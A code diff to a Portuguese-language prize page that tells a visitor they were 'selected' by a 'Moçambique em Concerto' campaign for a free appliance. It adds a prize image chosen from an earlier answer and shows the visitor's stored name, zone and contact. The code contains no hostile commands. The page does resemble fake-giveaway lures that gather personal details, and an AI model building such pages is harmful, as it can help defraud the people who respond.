@@ -127,7 +127,7 @@
 
     <div class="resultado" id="resultado">
       <h1>🎉 Parabéns, <span id="nomeClienteSpan"></span>!</h1>
-      <img src="img/premio.jpg" alt="Produto Ganhado" class="imagem-premio">
+      <img id="imgPremio" src="" alt="Produto Ganhado" class="imagem-premio">
 
       <div class="mensagem">
         <p>Foste seleccionado pela campanha <strong>Moçambique em Concerto</strong> para receber <strong>um Electrodoméstico Gratuito</strong> (imagem acima), como parte da nossa distribuição nacional.</p>
@@ -159,14 +159,23 @@
     const nome = localStorage.getItem('nomeCliente') || "Cliente";
     const zona = localStorage.getItem('zonaCliente') || "Zona não definida";
     const contacto = localStorage.getItem('contactoCliente') || "Sem contacto";
+    const resposta = localStorage.getItem('resposta3') || "";
 
-    // Preencher campos
+    // Definir imagem com base na escolha
+    const imgMap = {
+      "Geleira": "img/geleira.jpg",
+      "Congelador": "img/congelador.jpg",
+      "TV Smart 42”": "img/tvsmart.jpg"
+    };
+    const imgSrc = imgMap[resposta] || "img/premio.jpg";
+
+    document.getElementById('imgPremio').src = imgSrc;
     document.getElementById('nomeClienteSpan').textContent = nome;
     document.getElementById('nomeClienteSpan2').textContent = nome;
     document.getElementById('zonaClienteSpan').textContent = zona;
     document.getElementById('contactoClienteSpan').textContent = contacto;
 
-    // Mostrar resultado com efeito de suspense + scroll após 3 segundos
+    // Mostrar resultado com efeito e scroll
     setTimeout(() => {
       document.querySelector('.processando').style.display = 'none';
       const resultado = document.getElementById('resultado');
